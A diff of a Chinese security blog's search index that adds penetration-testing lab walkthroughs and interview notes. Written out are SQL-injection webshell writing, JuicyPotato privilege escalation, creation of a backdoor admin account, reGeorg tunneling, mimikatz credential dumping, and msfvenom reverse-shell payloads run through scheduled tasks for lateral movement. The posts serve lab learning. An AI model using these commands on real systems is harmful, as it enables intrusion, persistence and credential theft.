+<p>?id=1 order by 2 发现存在两个字段</p>
+<p>使用union select没有回显，使用 into outfile 进行文件写入</p>
+<p><code>?id = 1 and 1=2 union select 1,2 into outfile &#39;C:/phpStudy/WWW/m.txt&#39;</code></p>
+<p>访问  m.txt 成功写入</p>
+<p><img src="/posts/3796bdc4/m.png"></p>
+<p>尝试写入一句话到网站根目录中</p>
+<p><code>?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/zzz.php&#39;</code></p>
+<p>访问mm.php发现成功写入，使用蚁剑进行连接</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>进入终端查看当前权限 <code>whoami</code> 发现权限为 test权限</p>
+<p><code>ipconfig </code>发现内网ip 为 10.0.1.4</p>
+<p><code>netstat -ano</code> 查看开放的端口</p>
+<p><code>tasklist</code> 查看运行的进程</p>
+<p><code>systeminfo</code>  查看系统信息 补丁号 </p>
+<p><img src="/posts/3796bdc4/buding.png"></p>
+<p><a href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a> </p>
+<p>去这个网站找一下可以利用的exp</p>
+<br>
+
+<h4 id="JuicyPotato提权"><a href="#JuicyPotato提权" class="headerlink" title="JuicyPotato提权"></a>JuicyPotato提权</h4><p>HotPotato提权</p>
+<p>上传 JuicyPotato.exe </p>
+<p><code>bbb.exe -p &quot;whoami&quot;</code></p>
+<p><img src="/posts/3796bdc4/potato.png"></p>
+<p>提权为system权限，然后再添加用户</p>
+<p><code>net user Mamor A1S2D3! /add</code> </p>
+<p> bbb.exe -p “net localgroup administrators Mamor /add”  //将用户添加到管理员组权限</p>
+<p><img src="/posts/3796bdc4/netuser1.png"></p>
+<p>net user 查看是否创建成功</p>
+<p><img src="/posts/3796bdc4/netuser2.png"></p>
+<p>成功创建用户</p>
+<br>
+
+<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>内网穿透两种方法:<br>1.让目标机器去连接外网主机(需要公网ip)  前提是目标可以访问外网<br>2.在目标机器上设置信号站(放一个web文件带目标服务器，所有的流量都要通过这个文件)</p>
+<p>使用reGeorg进行内网穿透 </p>
+<p>将 reGeorg中的 tunnel.nosocket.php 传到目标机器 改名为reG.php</p>
+<p>再公网访问下 </p>
+<p><img src="/posts/3796bdc4/reG1.png"></p>
+<p>本机执行 (python2)</p>
+<p><code>python reGeorgSocksProxy.py -l 127.0.0.1 -p 9999 -u http://afsgr16-b1ferw.aqlab.cn/reG.php</code></p>
+<p><img src="/posts/3796bdc4/reGrun.png"></p>
+<p>本机使用Proxifier 设置代理服务器 127.0.0.1 9999 socks5</p>
+<p><img src="/posts/3796bdc4/Proxy.png"></p>
+<p>设置代理规则 </p>
+<p><img src="/posts/3796bdc4/Proxy2.png"></p>
+<p>设置完代理后 使用 mstsc 远程连接10.0.1.4 成功登录</p>
+<br>
+
+<h4 id="使用-mimikatz-读取密码"><a href="#使用-mimikatz-读取密码" class="headerlink" title="使用 mimikatz 读取密码"></a>使用 mimikatz 读取密码</h4><p>将 mimikatz通过蚁剑上传到服务器 以管理员身份运行（windows2012/2016不能抓）</p>
+<p>提权<code> privilege::debug</code></p>
+<p><img src="/posts/3796bdc4/mm2.png"></p>
+<p>抓取密码 <code>sekurlsa::logonpasswords</code></p>
+<p>成功抓取到Administrator密码 woshifengge1.</p>
+<p><img src="/posts/3796bdc4/mm3.png"></p>
+<br>
+
+<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>探测内网中是否还有其它主机</p>
+<p>mstsc 尝试连接10.0.1.8 使用admin 密码成功登录</p>
+<p>得到flag</p>
+<p><img src="/posts/3796bdc4/flag.png"></p>
+]]></content>
+      <categories>
+        <category>zkaq</category>
+      </categories>
+      <tags>
+        <tag>zkaq</tag>
       </tags>
   </entry>
   <entry>
@@ -3725,6 +3732,137 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>常用Windows远程连接和相关命令</title>
+    <url>/posts/9527b68a/</url>
+    <content><![CDATA[<h3 id="IPC-共享连接"><a href="#IPC-共享连接" class="headerlink" title="IPC$共享连接"></a>IPC$共享连接</h3><p>IPC$ （Internet Process Connection) 共享”命名管道”的资源，为实现进程间通信而开放的通道。使用该命令可以与目标主机建立连接，建立连接后可以访问目标主机的文件，进行下载、上传、命令执行等操作。</p>
+<br>
+
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>目标主机开启139，445端口</li>
+<li>目标主机管理员开启<code>IPC$</code>默认共享服务</li>
+<li>知道目标主机的账号密码</li>
+</ul>
+<br>
+
+<h4 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h4><h5 id="查看Windows默认开启的共享"><a href="#查看Windows默认开启的共享" class="headerlink" title="查看Windows默认开启的共享"></a>查看Windows默认开启的共享</h5><p><code>net share</code> </p>
+<h5 id="查看当前主机所建立的连接"><a href="#查看当前主机所建立的连接" class="headerlink" title="查看当前主机所建立的连接"></a>查看当前主机所建立的连接</h5><p><code>net use</code></p>
+<h4 id="确定主机时间"><a href="#确定主机时间" class="headerlink" title="确定主机时间"></a>确定主机时间</h4><p><code>net time \\ip </code></p>
+<h4 id="开启-关闭IPC-共享"><a href="#开启-关闭IPC-共享" class="headerlink" title="开启/关闭IPC$共享"></a>开启/关闭IPC$共享</h4><p><code>net share ipc$</code> </p>
+<p><code>net share ipc$ /del</code></p>
+<h5 id="建立空连接"><a href="#建立空连接" class="headerlink" title="建立空连接"></a>建立空连接</h5><p><code>net use \\127.0.0.1\ipc$  &quot;&quot;  /user:&quot;&quot; </code></p>
+<h5 id="建立完整的用户名-密码IPC-连接"><a href="#建立完整的用户名-密码IPC-连接" class="headerlink" title="建立完整的用户名 密码IPC$连接"></a>建立完整的用户名 密码IPC$连接</h5><p><code>net use \\10.10.0.164\ipc$ &quot;password&quot;  /user:&quot;username&quot; </code></p>
+<h5 id="删除IPC-连接"><a href="#删除IPC-连接" class="headerlink" title="删除IPC$连接"></a>删除IPC$连接</h5><p><code>net use \\127.0.0.1\ipc$ /del</code></p>
+<h5 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h5><p><code>net use z: \\10.10.0.164\c$  &quot;password&quot; /user:&quot;username&quot; </code> 把目标主机的c盘映射到本地主机的z盘(没有建立ipc连接情况下)</p>
+<p><code>net use z: \\10.10.0.164\c$</code>（已经建立ipc连接的情况下）</p>
+<p><img src="/posts/9527b68a/yingshe.png"></p>
+<h5 id="删除映射的z盘"><a href="#删除映射的z盘" class="headerlink" title="删除映射的z盘"></a>删除映射的z盘</h5><p><code>net use z: /del </code></p>
+<h5 id="删除全部"><a href="#删除全部" class="headerlink" title="删除全部"></a>删除全部</h5><p><code>net use * /del</code></p>
+<h5 id="使用dir查看目标机器目录"><a href="#使用dir查看目标机器目录" class="headerlink" title="使用dir查看目标机器目录"></a>使用dir查看目标机器目录</h5><p><code>dir \\10.10.0.164\c$</code></p>
+<p><img src="/posts/9527b68a/dir.png"></p>
+<h5 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h5><p><code>copy test.txt \\10.10.0.164\c$</code> 将test.txt复制到目标主机的c盘</p>
+<h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><p><code>copy \\10.10.0.164\c$\test.txt </code></p>
+<h4 id="使用at命令创建计划任务"><a href="#使用at命令创建计划任务" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h4><p><code>at \\&lt;目标主机ip&gt; &lt;启动时间&gt; &lt;木马所在位置&gt;</code></p>
+<p><code>at \\10.10.0.164  </code></p>
+<p>删除id为1的计划任务</p>
+<p><code>at \\10.10.0.164 1 /delete</code></p>
+<h4 id="使用type读取文件"><a href="#使用type读取文件" class="headerlink" title="使用type读取文件"></a>使用type读取文件</h4><p><code>type \\10.10.0.164\c$\1.txt </code>  读取目标机器的1.txt文件</p>
+<br>
+
+<br>
+
+<h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>win7  攻击机  </p>
+<p>win2012 目标机   10.10.0.164</p>
+<br>
+
+<p>使用win7与目标机建立ipc连接</p>
+<p><code>net use  \\10.10.0.164\ipc$ &quot;admin123!&quot; /user:&quot;administartor&quot; </code></p>
+<p>查看目标机器的时间</p>
+<p><code>net time \\10.10.0.164 </code></p>
+<p>使用dir读取目标机器c盘的文件</p>
+<p><code>dir \\10.10.0.164\c$ </code></p>
+<p>使用type读取目标主机c盘下的1.txt</p>
+<p><code>type \\10.10.0.164\c$\1.txt</code></p>
+<p>选择将目标主机的c盘映射到本地z盘</p>
+<p><code>net use z: \\10.10.0.164\c$ </code></p>
+<p>在建立ipc连接后利用Psexec反弹cmd</p>
+<p><code>Psexec.exe \\10.10.0.164 -s cmd.exe -acceptcula</code></p>
+<p><img src="/posts/9527b68a/Psexec_cmd.png"> </p>
+<p>删除映射的z盘</p>
+<p><code>net use z: /del </code></p>
+<p>删除ipc$连接</p>
+<p><code>net use \\10.10.0.164\ipc$ /del</code></p>
+<p>删除全部</p>
+<p><code>net use * /del </code></p>
+<br>
+
+<h3 id="IPC-计划任务进行横向渗透"><a href="#IPC-计划任务进行横向渗透" class="headerlink" title="IPC+计划任务进行横向渗透"></a>IPC+计划任务进行横向渗透</h3><h4 id="使用schtasks命令"><a href="#使用schtasks命令" class="headerlink" title="使用schtasks命令"></a>使用schtasks命令</h4><p>利用流程</p>
+<ol>
+<li>与目标建立IPC连接</li>
+<li>使用copy命令将木马、命令脚本复制到目标机器</li>
+<li>目标机器创建计划任务，使其自动触发木马、脚本</li>
+<li>删除IPC连接</li>
+</ol>
+<p>环境</p>
+<pre><code>攻击机  192.168.0.128 (kali)
+
+目标机  192.168.0.164 (Win2012）
+
+跳板机  192.168.0.157 (WIn2008)
+</code></pre>
+<br>
+
+<h5 id="跳板机与目标机建立IPC连接"><a href="#跳板机与目标机建立IPC连接" class="headerlink" title="跳板机与目标机建立IPC连接"></a>跳板机与目标机建立IPC连接</h5><p><code>net use \\192.168.0.164\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></p>
+<h5 id="kali上生成木马"><a href="#kali上生成木马" class="headerlink" title="kali上生成木马"></a>kali上生成木马</h5><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
+<h4 id="将shell-exe传到跳转机上"><a href="#将shell-exe传到跳转机上" class="headerlink" title="将shell.exe传到跳转机上"></a>将shell.exe传到跳转机上</h4><p>在kali上开启一个http服务</p>
+<p><code>python3 -m http.server 9999</code></p>
+<p>在跳转机上访问并下载shell.exe</p>
+<h5 id="在跳转机上使用copy命令将shell-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell.exe复制到目标机"></a>在跳转机上使用copy命令将shell.exe复制到目标机</h5><p><code>copy shell.exe \\192.168.0.164\c$</code></p>
+<p><img src="/posts/9527b68a/schtasks_dir.png"></p>
+<h5 id="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe"><a href="#利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe" class="headerlink" title="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe"></a>利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</h5><p><code>schtasks /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
+<p><img src="/posts/9527b68a/schtasks1.png"></p>
+<p>使用nc监听win2008跳转机的8888端口</p>
+<p><img src="/posts/9527b68a/schtasks_nc.png"></p>
+<h5 id="利用schtasks-执行命令，使用type读取文件内容"><a href="#利用schtasks-执行命令，使用type读取文件内容" class="headerlink" title="利用schtasks 执行命令，使用type读取文件内容"></a>利用schtasks 执行命令，使用type读取文件内容</h5><p><code>schtasjs /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /sc minute /mo 1 /tr &quot;c:\cmd.exe /c &#39;ipconfig &gt; c:\result.txt&#39;&quot;  /ru system /f</code></p>
+<p><img src="/posts/9527b68a/schtasks2.PNG"></p>
+<p>查看是否生成result.txt</p>
+<p><code>dir \\192.168.0.164\c$</code></p>
+<p><img src="/posts/9527b68a/schtasks_dir2.png"></p>
+<p>查看result.txt的内容</p>
+<p><code>type \\192.168.0.164\c$\result.txt</code></p>
+<p><img src="/posts/9527b68a/result.png"></p>
+<h5 id="schtasks-删除计划任务"><a href="#schtasks-删除计划任务" class="headerlink" title="schtasks 删除计划任务"></a>schtasks 删除计划任务</h5><p><code>schtasks /Delete /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /f</code></p>
+<p><img src="/posts/9527b68a/schtasks_delete.png"></p>
+<h5 id="断开ipc-连接"><a href="#断开ipc-连接" class="headerlink" title="断开ipc$连接"></a>断开ipc$连接</h5><p><code>net use \\192.168.0.164\ipc$ /del  </code></p>
+<h5 id="schtasks-参数"><a href="#schtasks-参数" class="headerlink" title="schtasks 参数"></a>schtasks 参数</h5><blockquote>
+<p>S [目标主机]<br>/U [目标用户名]<br>/P [目标密码]<br>/TN [任务名称]<br>/TR [执行程序]<br>/SC [执行方式，once为执行1次]<br>/ST [定时计划执行时间]<br>/f  [默认为Y，不进行回显交互，直接运行]<br>/i  [显示程序窗口交互]</p>
+</blockquote>
+<h4 id="使用at命令"><a href="#使用at命令" class="headerlink" title="使用at命令"></a>使用at命令</h4><p>at命令和schtasks命令类似</p>
+<p>注意: Windows Server 2012 以后的版本没有at命令，只有schtasks命令<br>所以在这里使用win7 代替之前使用的win2012<br>环境<br>win7  192.168.0.129<br>win2008 192.168.0.157</p>
+<h5 id="与建立目标机器建立IPC连接"><a href="#与建立目标机器建立IPC连接" class="headerlink" title="与建立目标机器建立IPC连接"></a>与建立目标机器建立IPC连接</h5><p><code>net use \\192.168.0.157\ipc$ &quot;admin123!&quot; /user:&quot;administrator&quot;  </code></p>
+<h5 id="在跳转机上使用copy命令将shell2-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell2-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell2.exe复制到目标机"></a>在跳转机上使用copy命令将shell2.exe复制到目标机</h5><p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
+<h5 id="使用at命令创建计划任务-1"><a href="#使用at命令创建计划任务-1" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h5><p>查看目标机器时间</p>
+<p><code>net time \\192.168.0.157 </code> 这里的时间可能与本地不符合</p>
+<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code> </p>
+<p><img src="/posts/9527b68a/at_shell2.png"></p>
+<h5 id="查看任务列表"><a href="#查看任务列表" class="headerlink" title="查看任务列表"></a>查看任务列表</h5><p><code>at \\192.168.0.157 </code><br><img src="/posts/9527b68a/at_shell3.png"></p>
+<br>
+
+<br>
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
+<p><a href="https://www.secrss.com/articles/26810">https://www.secrss.com/articles/26810</a></p>
+<p><a href="http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS">http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</a></p>
+<p><a href="https://www.cnblogs.com/mindzone/p/14293851.html">https://www.cnblogs.com/mindzone/p/14293851.html</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>暗月内网靶机WP</title>
     <url>/posts/ab4fb19a/</url>
     <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>web服务器  </p>
@@ -3815,24 +3953,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>记一次hw面试经历(2)</title>
-    <url>/posts/e9000575/</url>
-    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
-<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
-<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
-<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
-<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
-<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
-<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
-]]></content>
-      <categories>
-        <category>面试</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>某网站sql盲注</title>
     <url>/posts/a615296a/</url>
     <content><![CDATA[<p><code>http://www.xxxxxx.com/products.php?id=113</code></p>
@@ -3884,30 +4004,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>设备磁盘/CD-ROM配置不正确</title>
-    <url>/posts/f1a8aa3a/</url>
-    <content><![CDATA[<p>IDE 设备 (磁盘/CD-ROM)配置不正确。“ide0:1”上具有一个 IDE 从设备，但没有主设备。此配置在虚拟机中无法正常运行。请使用配置编辑器将磁盘/CD-ROM 从“ide0:1”移到“ide0:0”。<br>解决方案:<br>虚拟机设置-&gt;CD/DVD(IDE)-&gt;高级-&gt;IDE-&gt;设置为’IDE 0:0  CD/DVD(IDE)’</p>
-]]></content>
-      <categories>
-        <category>VM</category>
-      </categories>
-      <tags>
-        <tag>VM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用proxychains4gitclone拒绝访问</title>
-    <url>/posts/3a6e39d4/</url>
-    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记一次hw面试经历(1)</title>
     <url>/posts/40769f33/</url>
     <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
@@ -3947,6 +4043,80 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </categories>
       <tags>
         <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次hw面试经历(2)</title>
+    <url>/posts/e9000575/</url>
+    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
+<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
+<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
+<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
+<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
+<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
+<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
+]]></content>
+      <categories>
+        <category>面试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次长亭安全研究员实习生面试的经历</title>
+    <url>/posts/e38ec14f/</url>
+    <content><![CDATA[<p>前言:这个是在boss上hr昨天联系的我，然后今天下午通知我晚上进行面试…说的主要是研究比赛之类的，我说这个我不是很擅长，然后就尝试一下吧</p>
+<hr>
+<p>1.自我介绍</p>
+<p>2.个人规划</p>
+<p>3.近期参加的比赛，得过什么成绩吗</p>
+<p>4.你认为什么是一道优秀的题目</p>
+<p>回答的主要意思就是希望题目更贴近于实际环境</p>
+<p>5.时间盲注用到的函数有哪些？如果sleep被禁用了还有什么函数可以替代</p>
+<p>if sleep substr ，问sleep的替代函数时没想到，之前没接触过然后查了下是<code>benchmark</code></p>
+<p>6.什么是二次注入</p>
+<p>第一次注入后数据中存在脏数据，然后再次调用时没有对存在脏数据的数据进行检测，执行了数据库命令，从而使造成了数据库的注入</p>
+<p>7.了解反序列化吗，说一下反序列化漏洞的原理</p>
+<p>反序列化就是将字符数据转换为对象进行存储，然后再反序列化的</p>
+<p>之前接触过shiro反序列化，fastjosn，weblogic</p>
+<p>拿shiro反序列化举例子，shiro的RememberMe字段的值会先进行序列化，然后再进行AES加密，在进行base64加密。相对的，解密过程则是先对RememberMe的值进行base64解密，AES解密，反序列化。那么可以将构造恶意代码的语句放到Shiro的Cookie RememberMe中，被shiro服务器进行解析时，会进行反序列化，最后恶意代码会被执行从而造成反序列化漏洞。</p>
+<p>8.说一下你印象较深的题目</p>
+<p>我说了下之前4月份有接触过ssti，但是问我ssti的原理的时候就想不出来了…(在不正确使用模板引擎进行渲染时，会造成模板注入)</p>
+<p>9.XSS分类，说一下弹xss的语句有哪些?</p>
+<p>反射型，存储型，DOM型</p>
+<p>然后我就说了可以用script JavaScript frame 之类的，然后师傅让我说下具体的写法，然后就简单说了下，师傅说这样写的话大多数是无法执行的</p>
+<p>10.csrf和ssrf哪个危害更大一些？ssrf该如何防御</p>
+<p>ssrf可以内容读取，探测内网；csrf可以盗取cookie，然后我说应该是csrf吧（虽然知道他们的作用，但是还是拿不定主意）然后师傅有问了下才确定是ssrf危害大。</p>
+<p>然后问ssrf如何防御</p>
+<p>11.泄漏类题目有接触过吗，接触过哪些</p>
+<p>当时只想到了git泄漏，面试完突然想到了svn泄漏和DS_store泄漏</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hg源码泄漏</span><br><span class="line">.git源码泄露</span><br><span class="line">.DS_Store泄漏</span><br><span class="line">svn泄漏</span><br></pre></td></tr></table></figure>
+
+<p>12.有什么问题要提问吗</p>
+<p>当时只想到了刚才问的sleep函数的替代函数….别的都想不起来了，大脑一片空白…….</p>
+<br>
+
+<hr>
+<p>感觉应该是凉凉了，面试挺突然的，没做啥准备，而且这个实习是比赛方面的，作为签到型选手几率更渺茫了…wuwuwu….先把红日靶场搞完，好好准备秋招了！</p>
+]]></content>
+      <categories>
+        <category>面试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>设备磁盘/CD-ROM配置不正确</title>
+    <url>/posts/f1a8aa3a/</url>
+    <content><![CDATA[<p>IDE 设备 (磁盘/CD-ROM)配置不正确。“ide0:1”上具有一个 IDE 从设备，但没有主设备。此配置在虚拟机中无法正常运行。请使用配置编辑器将磁盘/CD-ROM 从“ide0:1”移到“ide0:0”。<br>解决方案:<br>虚拟机设置-&gt;CD/DVD(IDE)-&gt;高级-&gt;IDE-&gt;设置为’IDE 0:0  CD/DVD(IDE)’</p>
+]]></content>
+      <categories>
+        <category>VM</category>
+      </categories>
+      <tags>
+        <tag>VM</tag>
       </tags>
   </entry>
   <entry>
@@ -5163,176 +5333,6 @@ $R=$Z('',$X);$R();
       </categories>
       <tags>
         <tag>工具手册</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次长亭安全研究员实习生面试的经历</title>
-    <url>/posts/e38ec14f/</url>
-    <content><![CDATA[<p>前言:这个是在boss上hr昨天联系的我，然后今天下午通知我晚上进行面试…说的主要是研究比赛之类的，我说这个我不是很擅长，然后就尝试一下吧</p>
-<hr>
-<p>1.自我介绍</p>
-<p>2.个人规划</p>
-<p>3.近期参加的比赛，得过什么成绩吗</p>
-<p>4.你认为什么是一道优秀的题目</p>
-<p>回答的主要意思就是希望题目更贴近于实际环境</p>
-<p>5.时间盲注用到的函数有哪些？如果sleep被禁用了还有什么函数可以替代</p>
-<p>if sleep substr ，问sleep的替代函数时没想到，之前没接触过然后查了下是<code>benchmark</code></p>
-<p>6.什么是二次注入</p>
-<p>第一次注入后数据中存在脏数据，然后再次调用时没有对存在脏数据的数据进行检测，执行了数据库命令，从而使造成了数据库的注入</p>
-<p>7.了解反序列化吗，说一下反序列化漏洞的原理</p>
-<p>反序列化就是将字符数据转换为对象进行存储，然后再反序列化的</p>
-<p>之前接触过shiro反序列化，fastjosn，weblogic</p>
-<p>拿shiro反序列化举例子，shiro的RememberMe字段的值会先进行序列化，然后再进行AES加密，在进行base64加密。相对的，解密过程则是先对RememberMe的值进行base64解密，AES解密，反序列化。那么可以将构造恶意代码的语句放到Shiro的Cookie RememberMe中，被shiro服务器进行解析时，会进行反序列化，最后恶意代码会被执行从而造成反序列化漏洞。</p>
-<p>8.说一下你印象较深的题目</p>
-<p>我说了下之前4月份有接触过ssti，但是问我ssti的原理的时候就想不出来了…(在不正确使用模板引擎进行渲染时，会造成模板注入)</p>
-<p>9.XSS分类，说一下弹xss的语句有哪些?</p>
-<p>反射型，存储型，DOM型</p>
-<p>然后我就说了可以用script JavaScript frame 之类的，然后师傅让我说下具体的写法，然后就简单说了下，师傅说这样写的话大多数是无法执行的</p>
